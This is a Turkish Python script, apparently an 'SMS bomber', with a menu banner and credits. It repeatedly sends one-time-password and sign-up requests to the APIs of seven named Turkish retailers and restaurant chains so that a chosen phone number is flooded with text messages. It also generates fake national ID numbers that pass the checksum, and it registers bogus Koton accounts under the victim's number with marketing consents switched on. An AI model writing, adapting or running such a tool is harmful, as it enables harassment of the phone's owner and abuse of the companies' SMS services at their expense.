import requests
from random import choice, randint
from string import ascii_lowercase
from colorama import Fore, Style
import time
import random
import os
import colorama

colorama.init()

class SendSms():
    adet = 0
    def __init__(self, phone, mail=""):
        rakam = []
        tcNo = ""
        rakam.append(randint(1, 9))
        for i in range(1, 9):
            rakam.append(randint(0, 9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((sum(rakam[:10])) % 10)
        for r in rakam:
            tcNo += str(r)
        self.tc = tcNo
        self.phone = str(phone)
        self.mail = mail if mail else ''.join(choice(ascii_lowercase) for i in range(22)) + "@gmail.com"

    def sms_gonder_bim(self):
        url = "https://bim.veesk.net:443/service/v1.0/account/login"
        payload = {"phone": self.phone}
        try:
            response = requests.post(url, json=payload)
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+]{Fore.WHITE} SMS başarıyla gönderildi! (BIM)")
                self.adet += 1
            else:
                print(f"{Fore.RED}[-]{Fore.WHITE} SMS gönderilemedi: BIM")
        except Exception as e:
            print(f"Error in Bim API: {e}")

    def sms_gonder_englishhome(self):
        url = "https://www.englishhome.com:443/api/member/sendOtp"
        payload = {"phone": self.phone}
        try:
            response = requests.post(url, json=payload)
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+]{Fore.WHITE} SMS başarıyla gönderildi! (English Home)")
                self.adet += 1
            else:
                print(f"{Fore.RED}[-]{Fore.WHITE} SMS gönderilemedi: English Home")
        except Exception as e:
            print(f"Error in English Home API: {e}")

    def sms_gonder_dominos(self):
        url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
        headers = {"Content-Type": "application/json;charset=utf-8"}
        json_data = {"email": self.mail, "isSure": False, "mobilePhone": self.phone}
        try:
            response = requests.post(url, headers=headers, json=json_data, timeout=6)
            if response.json().get("isSuccess") == True:
                print(f"{Fore.GREEN}[+]{Fore.WHITE} SMS başarıyla gönderildi! (Dominos)")
                self.adet += 1
            else:
                print(f"{Fore.RED}[-]{Fore.WHITE} SMS gönderilemedi: Dominos")
        except Exception as e:
            print(f"Error in Dominos API: {e}")

    def sms_gonder_kahvedunyasi(self):
        try:
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            headers = {
                "Content-Type": "application/json"
            }
            json_data = {"countryCode": "90", "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.json().get("processStatus") == "Success":
                print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Başarılı! {self.phone} --> Kahve Dünyası")
                self.adet += 1
            else:
                print(f"{Fore.LIGHTRED_EX}[-]{Style.RESET_ALL} Başarısız! {self.phone} --> Kahve Dünyası")
        except Exception as e:
            print(f"Error in Kahve Dunyasi API: {e}")

    def Koton(self):
        try:
            url = "https://www.koton.com:443/users/register/"
            headers = {
                "Content-Type": "multipart/form-data; boundary=sCv.boundary",
                "X-Project-Name": "rn-env",
                "X-App-Type": "akinon-mobile",
                "X-Requested-With": "XMLHttpRequest",
                "X-App-Device": "ios"
            }
            data = f"""--sCv.boundary\r
content-disposition: form-data; name="first_name"\r
\r
Memati\r
--sCv.boundary\r
content-disposition: form-data; name="last_name"\r
\r
Bas\r
--sCv.boundary\r
content-disposition: form-data; name="email"\r
\r
{self.mail}\r
--sCv.boundary\r
content-disposition: form-data; name="password"\r
\r
31ABC..abc31\r
--sCv.boundary\r
content-disposition: form-data; name="phone"\r
\r
0{self.phone}\r
--sCv.boundary\r
content-disposition: form-data; name="confirm"\r
\r
true\r
--sCv.boundary\r
content-disposition: form-data; name="sms_allowed"\r
\r
true\r
--sCv.boundary\r
content-disposition: form-data; name="email_allowed"\r
\r
true\r
--sCv.boundary\r
content-disposition: form-data; name="date_of_birth"\r
\r
1993-07-02\r
--sCv.boundary\r
content-disposition: form-data; name="call_allowed"\r
\r
true\r
--sCv.boundary\r
content-disposition: form-data; name="gender"\r
\r
\r
--sCv.boundary--\r\n"""
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> koton.com")
                self.adet += 1
            else:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> koton.com")
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Hata oluştu! koton.com")

    def Komagene(self):
        try:
            url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder"
            json_data = {"FirmaId": 32, "Telefon": self.phone}
            r = requests.post(url=url, json=json_data, timeout=6)
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Komagene")
                self.adet += 1
            else:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! Komagene")
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Hata oluştu! Komagene")

    def Frink(self):
        try:
            url = "https://api.frink.com.tr:443/api/auth/postSendOTP"
            headers = {"Content-Type": "application/json"}
            json_data = {
                "areaCode": "90",
                "etkContract": True,
                "language": "TR",
                "phoneNumber": "90"+self.phone
            }
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.json()["processStatus"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Frink")
                self.adet += 1
            else:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! Frink")
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Hata oluştu! Frink")

    def api_fonksiyonlari(self):
        return [
            self.sms_gonder_bim,
            self.sms_gonder_englishhome,
            self.sms_gonder_dominos,
            self.sms_gonder_kahvedunyasi,
            self.Koton,
            self.Komagene,
            self.Frink
        ]

# Ana Menü Fonksiyonu
def ana_menu():
    os.system("cls||clear")
    print(Fore.RED + '''
    ▗▄▄▖ ▗▄▄▄▖▗▖  ▗▖ ▗▄▄▖
    ▐▌ ▐▌  █  ▐▛▚▖▐▌▐▌
    ▐▛▀▚▖  █  ▐▌ ▝▜▌▐▌▝▜▌
    ▐▌ ▐▌▗▄█▄▖▐▌  ▐▌▝▚▄▞▘
    ▗▄▄▖ ▗▄▄▄▖▗▄▄▄ ▗▄▄▄▖▗▄▄▖
    ▐▌ ▐▌  █  ▐▌  █▐▌   ▐▌ ▐▌
    ▐▛▀▚▖  █  ▐▌  █▐▛▀▀▘▐▛▀▚▖
    ▐▌ ▐▌▗▄█▄▖▐▙▄▄▀▐▙▄▄▖▐▌ ▐▌
    maded by ||••CAKIR/MONTANA••||
    ''')
    print(Fore.YELLOW + "1. SMS'e Başla")
    print("2. Emeği Geçenler")
    print("3. Çıkış\n")
    secim = input(Fore.CYAN + "Seçiminizi yapın (1/2/3): ")

    if secim == "1":
        os.system("cls||clear")
        sms_baslat()
    elif secim == "2":
        os.system("cls||clear")
        emegi_gecenler()
    elif secim == "3":
        os.system("cls||clear")
        print("Çıkılıyor...")
        exit()
    else:
        os.system("cls||clear")
        print("Geçersiz seçim! Tekrar deneyin.")
        time.sleep(1)
        ana_menu()

def sms_baslat():
    numara = input("Telefon numaranızı girin (başında sıfır olmadan): ")
    mail = input("Mail adresinizi girin (isteğe bağlı): ")
    sms_obj = SendSms(numara, mail)
    sms_sayisi = int(input("Kaç SMS göndermek istiyorsunuz? "))
    aralik = int(input("Kaç saniye aralıklarla göndermek istersiniz? "))

    for i in range(sms_sayisi):
        random.choice(sms_obj.api_fonksiyonlari())()
        if i < sms_sayisi - 1:
            print(f"{aralik} saniye bekleniyor...\n")
            time.sleep(aralik)

    print(f"\nToplamda {sms_obj.adet} başarılı SMS gönderildi.")
    input("Ana menüye dönmek için Enter'a basın...")
    ana_menu()

def emegi_gecenler():
    os.system("cls||clear")
    print(Fore.YELLOW + "SMS Botunu geliştirenler:")
    print("- Geliştirici: CAKIR-MONTANA")
    print("- Katkı: API Sağlayıcılar")
    print("- Sürüm: Geliştirilmiş v2.0")
    input('\nAna menüye dönmek için Enter’a basın...')
    ana_menu()

# Başlat
ana_menu()